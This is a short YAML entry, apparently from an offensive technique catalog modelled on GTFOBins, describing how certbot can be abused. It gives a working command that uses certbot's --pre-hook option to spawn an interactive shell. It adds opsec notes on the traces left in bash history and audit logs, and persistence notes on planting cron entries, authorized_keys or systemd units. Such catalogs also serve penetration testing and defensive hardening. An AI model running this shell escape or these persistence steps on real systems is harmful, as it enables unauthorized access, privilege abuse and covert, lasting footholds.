---
name: certbot
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'
  notes: This needs a writable directory, replace `.` if needed.
references:
- https://gtfobins.github.io/gtfobins/certbot/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
